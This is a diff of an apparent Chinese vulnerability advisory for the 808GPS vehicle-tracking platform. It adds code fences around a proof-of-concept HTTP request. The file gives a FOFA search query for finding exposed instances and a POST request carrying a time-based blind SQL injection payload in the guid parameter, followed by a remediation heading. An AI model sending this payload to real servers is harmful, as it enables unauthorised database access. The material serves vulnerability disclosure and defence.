@@ -72,6 +72,7 @@ FOFA：body="/808gps/"
 
 POC/EXP：
 
+```
 POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
@@ -81,6 +82,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 
 guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP(5)))PITq) AND ('qhqF'='qhqF
+```
+
 
 
 # 修复方案
